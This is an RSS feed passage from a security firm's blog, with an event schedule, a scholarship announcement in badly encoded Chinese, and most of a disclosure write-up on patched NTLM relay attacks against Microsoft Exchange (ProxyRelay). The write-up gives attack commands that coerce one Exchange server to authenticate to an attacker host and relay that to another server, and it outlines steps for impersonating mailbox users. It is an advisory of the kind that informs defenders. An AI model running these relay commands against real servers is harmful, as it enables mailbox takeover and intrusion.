      &lt;td&gt;Ôºè&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;15:10 - 16:10&lt;/td&gt;
      &lt;td&gt;From Zero to Hero - ÂæûÈõ∂ÈñãÂßãÁöÑ Pwn2Own Â•™ÂÜ†‰πãË∑Ø&lt;/td&gt;
      &lt;td&gt;DEVCORE È¶ñÂ∏≠Ë≥áÂÆâÁ†îÁ©∂Âì° Orange&lt;br /&gt; &amp;amp; Ë≥áÊ∑±Ë≥áÂÆâÁ†îÁ©∂Âì° Angelboy&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;16:10 - 16:20&lt;/td&gt;
      &lt;td&gt;ÈñâÂπï&lt;/td&gt;
      &lt;td&gt;Ôºè&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Ë©≥Á¥∞Ë≥áË®äÂèäÂ†±ÂêçÊñπÂºèË´ãËá≥ KKTIX Êü•Ë©¢Ôºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;3/10 ‰ºÅÊ•≠Â†¥Ôºö&lt;a href=&quot;https://devcore.kktix.cc/events/devcoreconf2023-0310&quot;&gt;https://devcore.kktix.cc/events/devcoreconf2023-0310&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;3/11 Èß≠ÂÆ¢Â†¥Ôºö&lt;a href=&quot;https://devcore.kktix.cc/events/devcoreconf2023&quot;&gt;https://devcore.kktix.cc/events/devcoreconf2023&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/01/12/DEVCORE-conference-registration-open-now/</link>
                <guid>https://devco.re/blog/2023/01/12/DEVCORE-conference-registration-open-now</guid>
                <pubDate>Thu, 12 Jan 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>DEVCORE 2022 Âπ¥Â∫¶ÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏ÈáëÈ†íÁçéÈ§êÊïòÈ†ÜÂà©ËêΩÂπï</title>
                <description>&lt;p&gt;2022 Âπ¥Â∫¶„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÈ†íÁçéÈ§êÊïòÂ∑≤Êñº 12 Êúà 17 Êó•È†ÜÂà©ËêΩÂπï„ÄÇ&lt;/p&gt;

&lt;p&gt;‰∏ÄË∑ØËµ∞‰æÜÔºåÁÑ°Ë´ñÊòØÂú®ÊàëÂÄëÁöÑÂ≠∏Áøí‰πãË∑Ø„ÄÅÂâµÊ•≠ÈÅéÁ®ã‰∏≠ÔºåÊàëÂÄëÈÉΩÂèóÂà∞‰∫Ü‰æÜËá™ÂêÑÊñπÁöÑÊîØÊåÅËàáÂçîÂä©ÔºåÂõ†Ê≠§ÊàëÂÄë‰πüÂ∏åÊúõÂõûÈ•ãÁ§æÊúÉ‰∏¶ÂüπËÇ≤Ë≥áÂÆâ‰∫∫ÊâçÔºå‰ª•ÁçéÂ≠∏ÈáëÁöÑÊñπÂºèÔºåÂçîÂä©Â≠∏ÁîüÂª∫ÊßãÊ≠£Á¢∫Ë≥áÂÆâÊÑèË≠òÂèäÊäÄËÉΩÂ§ñÔºå‰πüËÉΩÂèäÊó©Áû≠Ëß£Ê•≠ÁïåÁèæÊ≥ÅÔºåÈôç‰ΩéÁî¢Â≠∏ËêΩÂ∑Æ„ÄÇ&lt;/p&gt;

&lt;p&gt;„ÄåÊà¥Â§´ÂØáÁàæÂÖ®ÂúãË≥áË®äÂÆâÂÖ®ÁçéÂ≠∏Èáë„ÄçÊØèÂπ¥Ë£úÂä© 10 ÂêçÂú®Ë≥áÂÆâÈ†òÂüüÁ†îÁ©∂ÊàêÊûúÂÇëÂá∫ÁöÑÂ§ßÂ∞àÈô¢Ê†°Â≠∏ÁîüÔºåÊØèÂêçÈ†íÁôº 2 Ëê¨ÂÖÉÁçéÈáëÔºåÂ∏åÊúõ‰ΩøÈÄô‰∫õË≥áÂÆâÁïåÁöÑÊòéÊó•‰πãÊòüÂæó‰ª•ÁÑ°ÂæåÈ°ß‰πãÊÜÇÔºåÂ∞àÊ≥®Á≤æÈÄ≤Ë≥áÂÆâÊäÄË°ìÔºåÊú™‰æÜÊàêÁÇ∫Áç®Áï∂‰∏ÄÈù¢ÁöÑË≥áÂÆâ‰∫∫Êâç„ÄÇ&lt;/p&gt;

&lt;p&gt;Ê≠§Ê¨°Áç≤ÁçéÂêåÂ≠∏ÈÅç‰ΩàÂÖ®Âè∞ÔºåÂàÜÂà•‰æÜËá™Âü∫ÈöÜÂïÜÂ∑•Ë≥áË®äÁßë„ÄÅÂè∞ÁÅ£Â∏´ÁØÑÂ§ßÂ≠∏Ë≥áË®äÂ∑•Á®ãÁ≥ª„ÄÅÈôΩÊòé‰∫§ÈÄöÂ§ßÂ≠∏Ë≥áË®äÁßëÂ≠∏ËàáÂ∑•Á®ãÁ†îÁ©∂ÊâÄÂèäË≥áÈõª‰∫•ÂÆ¢ËàáÂÆâÂÖ®Â≠∏Á®ã„ÄÅÊ∏ÖËèØÂ§ßÂ≠∏Ë≥áË®äÂÆâÂÖ®Á†îÁ©∂ÊâÄ„ÄÅÈÄ¢Áî≤Â§ßÂ≠∏Ë≥áË®äÂ∑•Á®ãÁ≥ª„ÄÅÂè∞‰∏≠ÁßëÊäÄÂ§ßÂ≠∏Ë≥áË®äÁÆ°ÁêÜÁ≥ª„ÄÅÂçóÂè∞ÁßëÊäÄ‚º§Â≠∏Ë≥áË®äÂ∑•Á®ãÁ≥ªÁ≠â„ÄÇÁç≤ÁçéÂêåÂ≠∏ÁöÜÂ∞áÁç≤ÁçéË¶ñÁÇ∫ÈáçË¶ÅËÇØÂÆöÔºå‰πüË°®Á§∫Â∏åÊúõÊåÅÁ∫åÁ≤æÈÄ≤Ëá™Â∑±Ôºå‰∏¶Â∞áÁ∂ìÈ©óÂàÜ‰∫´Áµ¶‰ªñ‰∫∫„ÄÅÂõûÈ•ãÁ§æÊúÉÔºåÂÖ∂‰∏≠‰πüÊúâÂ•ΩÂπæ‰ΩçÂêåÂ≠∏Â∏åÊúõÊú™‰æÜËÉΩÂä†ÂÖ• DEVCORE„ÄÇ&lt;/p&gt;

&lt;p&gt;„ÄåÁï∂ÊôÇÂèóÂà∞ DEVCORE Âπ´Âä©ÔºåÊàëË™™Êú™‰æÜ‰∏ÄÂÆöÊâæÊ©üÊúÉÂ•ΩÂ•ΩÊÑüË¨ù DEVCORE„ÄÇ‰ΩÜ DEVCORE ÂõûÊáâ„ÄéÂè™Ë¶ÅÊääÈÄô‰ªΩÊÑüË¨ùÁöÑÂøÉÊÉÖÔºåÊãøÂéªÂπ´Âä©ÂÖ∂‰ªñ‰∫∫ÔºåÂ∞±ÊòØÊúÄÂ•ΩÁöÑÂõûÂ†±„ÄèÔºåÂõ†ÁÇ∫ÈÄôÂè•Ë©±ÔºåÊàëÂØ´‰∫Ü‰∏Ä‰∫õÊñáÁ´†ÔºåÂ∏åÊúõËÉΩÂπ´Âä©Âà∞ÂÖ∂‰ªñ‰∫∫„ÄÇÂú®Êú™‰æÜÔºåÊàë‰πüÊúÉÁπºÁ∫åÂπ´Âä©ÂÖ∂‰ªñ‰∫∫Ôºå‰ª•Ê≠§‰æÜÂõûÂ†±Ë≤¥ÂÖ¨Âè∏Âú®Ë≥áÂÆâÁïåÁÑ°ÁßÅÁöÑÂ•âÁçª„ÄÇ„ÄçÊ∏ÖÂ§ßËòáÂêåÂ≠∏Ë™™„ÄÇ&lt;/p&gt;

&lt;p&gt;ÈôΩÊòé‰∫§ÈÄöÂ§ßÂ≠∏È´òÂêåÂ≠∏ÂâáË°®Á§∫ÔºåÂ∞áÈÅãÁî®ÈÄôÁ≠ÜÁçéÂ≠∏ÈáëË≥ºË≤∑ÂéüÊú¨Ë≤†Êìî‰∏çËµ∑ÁöÑÊòÇË≤¥Áâ©ËÅØÁ∂≤Ë®≠ÂÇôÂèäÁõ∏ÈóúÂ∑•ÂÖ∑Ôºå‰ª•Âà©ÈÄ≤Ë°åË≥áÂÆâÁõ∏ÈóúÁ†îÁ©∂Ôºå‰πüÂ∞áË≥ºÂÖ•Ë≥áË®äÁõ∏ÈóúÊõ∏Á±çÔºåÊèêÂçáËá™Â∑±ÁöÑÁü•Ë≠ò„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúüÂæÖÁç≤ÁçéÂêåÂ≠∏ÂÄëÊú™‰æÜÊåÅÁ∫åÊ∑±ËÄïË≥áÂÆâÁü•Ë≠òËàáÊäÄË°ìÔºåÂú®Ë≥áÂÆâËàûÂè∞‰∏äÁôºÂÖâÁôºÁÜ±ÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2022/12/23/2022-devcore-national-cyber-security-scholarship-results-announcement/</link>
                <guid>https://devco.re/blog/2022/12/23/2022-devcore-national-cyber-security-scholarship-results-announcement</guid>
                <pubDate>Fri, 23 Dec 2022 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 4 - ProxyRelay!</title>
                <description>&lt;p&gt;Hi, this is a long-time-pending article. We could have published this article earlier (the original bug was reported to MSRC in June 2021 with a 90-days Public Disclosure Policy). However, during communications with MSRC, they explained that since this is an architectural design issue, lots of code changes and testings are expected and required, so they hope to resolve this problem with a one-time CU (Cumulative Update) instead of the regular Patch Tuesday. We understand their situation and agree to extend the deadline.&lt;/p&gt;

&lt;p&gt;Microsoft eventually released &lt;a href=&quot;https://support.microsoft.com/en-au/topic/cumulative-update-12-for-exchange-server-2019-kb5011156-6a4e598a-876c-4ff1-9cfa-f7b87246f1d8&quot;&gt;Exchange Server 2019 CU 12&lt;/a&gt; and &lt;a href=&quot;https://support.microsoft.com/en-us/topic/cumulative-update-23-for-exchange-server-2016-kb5011155-98183ada-e4cd-465f-b201-69d40fb74678&quot;&gt;Exchange Server 2016 CU 23&lt;/a&gt; on April 20, 2022. However, &lt;strong&gt;this patch did not enable by default&lt;/strong&gt;. Microsoft didn‚Äôt release the patch-activating methods until August 09, 2022. So, we originally had the opportunity to demonstrate our attack at &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2022/1/12/pwn2own-vancouver-2022-luanch&quot;&gt;Pwn2Own Vancouver 2021&lt;/a&gt;. However, we dropped the idea quickly because our intention is not to earn bounties. We are here to &lt;a href=&quot;https://devco.re/en/about/&quot;&gt;secure the world&lt;/a&gt;! You can check the &lt;a href=&quot;#Timeline&quot;&gt;Timeline&lt;/a&gt; to know the detailed disclosure process.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;idea&quot;&gt;Idea&lt;/h1&gt;

&lt;p&gt;Since Microsoft blocked our Proxy-Related attacks in April 2021, I have been thinking about whether there is a way to bypass the mitigation. During that April patch, Microsoft enhanced the authentication part of CAS Frontend by requiring all HTTP requests that need a Kerberos Ticket to be authenticated first. This enhancement effectively mitigated the attack surface we proposed and stopped unauthenticated HTTP requests accessing the CAS Backend. So Exchange is safe now?&lt;/p&gt;

&lt;p&gt;Of course not, and this article is to prove this! Since Microsoft only fixes the problematic code, we proposed several attacks and possible weaknesses in our &lt;a href=&quot;https://powerofcommunity.net/2021.htm&quot;&gt;POC 2021&lt;/a&gt; and &lt;a href=&quot;https://hitcon.org/2021/agenda/279d7810-e619-4dc3-9113-b11bad5277ec/&quot;&gt;HITCON 2021&lt;/a&gt; talks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20221019/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Maybe you have heard that our first prediction has already been made in recent &lt;a href=&quot;https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9&quot;&gt;ProxyNotShell&lt;/a&gt;. The attack reuses the path confusion of ProxyShell but attaches a pre-known authentication instead. It‚Äôs solid but it looks it still needs a valid authentication (not sure, still haven‚Äôt time to dig into). However, we hinted there is another way not to fight with the auth-enhancement face-to-face during my talks. Now we can finally disclose it :)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Just in case you don‚Äôt know, I am a big fan of &lt;a href=&quot;https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn&quot;&gt;Printer Bug&lt;/a&gt; (kudos to &lt;a href=&quot;https://twitter.com/tifkin_&quot;&gt;Lee Christensen&lt;/a&gt;, &lt;a href=&quot;https://twitter.com/harmj0y&quot;&gt;Will Schroeder&lt;/a&gt;, and &lt;a href=&quot;https://twitter.com/enigma0x3&quot;&gt;Matt Nelson&lt;/a&gt; for their amazing talk at &lt;a href=&quot;https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory&quot;&gt;DerbyCon 2018&lt;/a&gt;). PrinterBug allows an attacker to coerce any domain-joined machine to initiate an SMB connection with its own Machine Account to the attacker via &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1&quot;&gt;MS-RPRN&lt;/a&gt; protocol. Because this behavior works as designed, this hacker-friendly feature has been extensively used for NTLM relaying for years.&lt;/p&gt;

&lt;p&gt;In the architecture of Exchange CAS, Backend authorizes an HTTP request to have the ability to impersonate any user by checking whether the login identity has the Extended Right of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ms-Exch-EPI-Token-Serialization&lt;/code&gt; or not. Also, during the Exchange Server installation, the mailbox server will be added to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exchange Servers group&lt;/code&gt; automatically, and all objects in this Active Directory group have that Token-Serialization right by default.&lt;/p&gt;

&lt;p&gt;With the prior knowledge in mind, I come up with a simple idea. It‚Äôs common to see multiple Exchange Servers in corporate networks for high availability and site resilience. &lt;strong&gt;Can we relay the NTLM authentication among Exchange Servers?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;There are several pros to this relay idea. Since it‚Äôs a cross-machine relay, it won‚Äôt be limited by the same-host restriction. Also, because the NTLM authentication is initiated by the Machine Account of Exchange Server, the relayed authentication owns the Token-Serialization right that allows us to impersonate any user in Exchange services. I believe this is a fantastic idea and would like to explore if it is exploitable!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. This attack surface was also found and reported to MSRC independently by &lt;a href=&quot;https://twitter.com/D1iv3&quot;&gt;Dlive&lt;/a&gt; from Tencent Xuanwu Lab, so you can see we share most of the CVE acknowledgments.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;Let‚Äôs talk about the vulnerabilities. Since it‚Äôs an entire attack surface instead of a single bug, this idea could be applied to different contexts, causing different vulnerabilities. The impact of these vulnerabilities is that an attacker can bypass Exchange authentications or even get code execution without user-interaction. Here are the related CVEs so far:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt; - Relay to Exchange FrontEnd&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979&quot;&gt;CVE-2022-21979&lt;/a&gt; - Relay to Exchange BackEnd&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414&quot;&gt;CVE-2021-26414&lt;/a&gt; - Relay to Windows DCOM&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-RESERVED&quot;&gt;CVE-2022-RESERVED&lt;/a&gt; - Relay to other services of Exchange&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The following attacks have the similar template, the host &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; stands for the first Exchange Server, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; for the second Exchange Server, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; for the attacker-controlled server.&lt;/p&gt;

&lt;p&gt;In all attacks, the attacker coerces the first Exchange Server to initiate an NTLM authentication to him, and relay it to the second Exchange Server. We use &lt;a href=&quot;https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py&quot;&gt;printerbug.py&lt;/a&gt; to coerce a server to initiate an SMB connection and use &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py&quot;&gt;ntlmrelayx.py&lt;/a&gt; to catch the NTLM and relay the authentication to another Exchange Server.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-1---relay-to-exchange-frontend&quot;&gt;Round 1 - Relay to Exchange FrontEnd&lt;/h2&gt;

&lt;p&gt;For the first context, we try to relay the authentication to another Frontend of Exchange Server. Since the identity of the relayed authentication is Exchange‚Äôs Machine Account which owns the Token-Serialization right, we can impersonate any user! Here we relay the NTLM authentication from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt;‚Äôs Frontend EWS service as the showcase. We implement the relay-to-frontend-EWS attack by customizing the &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/httpattack.py&quot;&gt;httpattack.py&lt;/a&gt;! Here is a simple overview:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntlmrelayx.py&lt;/code&gt; on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; server to wait for NTLM authentications.&lt;/li&gt;
  &lt;li&gt;Use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;printerbug.py&lt;/code&gt; to coerce &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; to initiate an SMB connection to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Receive the SMB connection on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ATTACKER&lt;/code&gt; and relay the NTLM blobs to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Complete the NTLM handshakes to get full access to the EWS endpoint.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Terminal 1&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python ntlmrelayx.py &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; https://EX02/EWS/Exchange.asmx

&lt;span class=&quot;c&quot;&gt;# Terminal 2&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python printerbug.py EX01 ATTACKER
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Theoretically, we can take over the target mailbox by &lt;a href=&quot;https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/ews-operations-in-exchange&quot;&gt;EWS operations&lt;/a&gt;. Here we give a demo to dump the secret under administrator‚Äôs mailbox.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/IFRvmo6AZoY&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h3 id=&quot;patching-frontend&quot;&gt;Patching FrontEnd&lt;/h3&gt;

&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt; and released a patch to fix that Frontend is relay-able in July 2021. Since logging in as Machine Account in Frontend isn‚Äôt a regular operation, it‚Äôs easy to mitigate the attack by adding a check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IsSystemOrMachineAccount()&lt;/code&gt; on the Frontend Proxy-Handler to ensure all Frontend logons are not Machine Account.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-2---relay-to-exchange-backend&quot;&gt;Round 2 - Relay to Exchange BackEnd&lt;/h2&gt;

&lt;p&gt;Relaying to Frontend can be easily mitigated by a simple check. How about relaying to Backend? Since Backend verifies the Frontend requests by checking whether it‚Äôs a Machine Account or not, mitigating Backend would be more challenging because it‚Äôs a regular operation and Backend needs the Machine Account that hash the extended right of ms-Exch-EPI-Token-Serialization to impersonate to the desired user. Here we provide 3 showcases against attacking Backend.&lt;/p&gt;

&lt;h3 id=&quot;2-1-attacking-backend-ews&quot;&gt;2-1 Attacking BackEnd &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/EWS&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;Based on the relay-to-frontend EWS attack we introduced, the earlier attack can be re-applied to Backend seamlessly. The only change is to modify the target port from 443 to 444.&lt;/p&gt;

&lt;h3 id=&quot;2-2-attacking-backend-rpc&quot;&gt;2-2 Attacking BackEnd &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/RPC&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;The other showcase is attacking &lt;a href=&quot;https://learn.microsoft.com/en-us/exchange/outlook-anywhere-exchange-2013-help&quot;&gt;Outlook Anywhere&lt;/a&gt;. Exchange defines several internal RPC services that can directly operate the mailbox. Those RPC services have a public interface and can be access through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Rpc/*&lt;/code&gt;, and users can access their own mailbox via RPC-over-HTTP protocol, which is described in Microsoft‚Äôs &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rpch/c0f4c9c5-1a61-4d10-b8e2-005378d1d212&quot;&gt;MS-RPCH&lt;/a&gt; specification. For those who want to understand the underlying mechanism, it‚Äôs recommended to read the awesome research &lt;a href=&quot;https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/&quot;&gt;Attacking MS Exchange Web Interfaces&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/_mohemiv&quot;&gt;Arseniy Sharoglazov&lt;/a&gt; for details.&lt;/p&gt;

&lt;p&gt;Back to our attack, the core logic is as same as attacking EWS. Because the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Rpc/*&lt;/code&gt; is also located at HTTP/HTTPS, it‚Äôs also relay-able. Once we bypass the authentication and access the route &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Rpc/RpcProxy.dll&lt;/code&gt;, we can impersonate as any user and operate his mailbox through the RPC-over-HTTP protocol. To implement the attack, we have ported lots of the &lt;a href=&quot;https://github.com/sensepost/ruler&quot;&gt;Ruler Project&lt;/a&gt; to &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;Impacket&lt;/a&gt;. As the result of this showcase, we can bypass the authentication by PrinterBug and operates any user‚Äôs mailbox through Outlook Anywhere. The entire attack can be illustrated as the following steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Establish &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCP_IN_DATA&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCP_OUT_DATA&lt;/code&gt;  channels to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; for RPC I/O.&lt;/li&gt;
  &lt;li&gt;Trigger PrinterBug on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01&lt;/code&gt; and relay to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt; to complete NTLM handshakes.&lt;/li&gt;
  &lt;li&gt;Attach &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;X-CommonAccessToken&lt;/code&gt; headers to indicate we are Exchange Admin on both HTTP headers.&lt;/li&gt;
  &lt;li&gt;Interact with the Outlook Anywhere by lots of the coding works upon &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrpc/137f0ce2-31fd-4952-8a7d-6c0b242e4b6a&quot;&gt;MS-OXCRPC&lt;/a&gt; and &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcrops/13af6911-27e5-4aa0-bb75-637b02d4f2ef&quot;&gt;MS-OXCROPS&lt;/a&gt; over MS-RPCH‚Ä¶&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;2-3-attacking-backend-powershell&quot;&gt;2-3 Attacking BackEnd &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/PowerShell&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;The last showcase we would like to highlight is relaying to Exchange PowerShell. Since we have bypassed the authentication on Backend IIS, it‚Äôs possible to perform a &lt;a href=&quot;https://blog.orange.tw/2021/08/proxyshell-a-new-attack-surface-on-ms-exchange-part-3.html&quot;&gt;ProxyShell-Like&lt;/a&gt; exploit again! Once we can execute arbitrary Exchange Cmdlets, it shouldn‚Äôt be hard to find a Post-Auth RCE to chain together because we are Exchange Admin. There are hundreds of Cmdlets for the purpose of Exchange Management, and many past cases (&lt;a href=&quot;https://srcincite.io/advisories/src-2020-0019/&quot;&gt;CVE-2020-16875&lt;/a&gt;, &lt;a href=&quot;https://srcincite.io/advisories/src-2020-0025/&quot;&gt;CVE-2020-17083&lt;/a&gt;, &lt;a href=&quot;https://x41-dsec.de/security/advisory/exploit/research/2020/12/21/x41-microsoft-exchange-rce-dlp-bypass/&quot;&gt;CVE-2020-17132&lt;/a&gt;, &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell&quot;&gt;CVE-2021-31207&lt;/a&gt; and more) have proven that this is not a difficult task, too.&lt;/p&gt;

&lt;p&gt;Since we decided not to participate in Pwn2Own, we did not implement this exploit chain. Here we leave this as an exercise for our readers. ;)&lt;/p&gt;

&lt;h3 id=&quot;2-4-patching-backend&quot;&gt;2-4 Patching BackEnd&lt;/h3&gt;

&lt;p&gt;Microsoft assigned &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979&quot;&gt;CVE-2022-21979&lt;/a&gt; and patch that in August 2022. This patch permanently eliminates all relay attacks on Backend by forcibly turning on the &lt;a href=&quot;https://msrc-blog.microsoft.com/2009/12/08/extended-protection-for-authentication/&quot;&gt;Extended Protection Authentication&lt;/a&gt; in IIS.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;round-3---relay-to-windows-dcom&quot;&gt;Round 3 - Relay to Windows DCOM&lt;/h2&gt;

&lt;p&gt;This part should be all credited to &lt;a href=&quot;https://twitter.com/D1iv3&quot;&gt;Dlive&lt;/a&gt;. The industry knows MS-DCOM is relay-able since &lt;a href=&quot;https://twitter.com/sploutchy&quot;&gt;Sylvain Heiniger&lt;/a&gt;‚Äôs awesome &lt;a href=&quot;https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc/&quot;&gt;Relaying NTLM authentication over RPC&lt;/a&gt; research for long. However, Dlive creates an RCE-chain based on the group inheritance of Exchange Servers in Active Directory environments. Please shout out to him!&lt;/p&gt;

&lt;p&gt;The idea of this attack is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Local Administrators&lt;/code&gt; group of Exchange Server includes the group member &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Exchange Trusted Subsystem&lt;/code&gt;, and all Exchange Server are in this group by default. That means the Machine Account &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX01$&lt;/code&gt; is also the local administrator of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX02&lt;/code&gt;. With this concept in mind, the impact of relay-to-MS-DCOM can be maximized and perfectly applied to Exchange Server now!&lt;/p&gt;

&lt;p&gt;Dlive has demonstrated this attack in his &lt;a href=&quot;https://www.youtube.com/watch?v=7h38rI8KT30&quot;&gt;DEFCON 29 talk&lt;/a&gt;. Although he didn‚Äôt publish the exploit code, the Wireshark screenshot in his &lt;a href=&quot;https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Tianze%20Ding%20-%20Vulnerability%20Exchange%20-%20One%20Domain%20Account%20For%20More%20Than%20Exchange%20Server%20RCE.pdf?page=45&quot;&gt;slides&lt;/a&gt;&lt;sup&gt;p45&lt;/sup&gt; has already hinted everything and is enough to reproduce. The process could be illustrated as the following:&lt;/p&gt;

&lt;ol&gt;
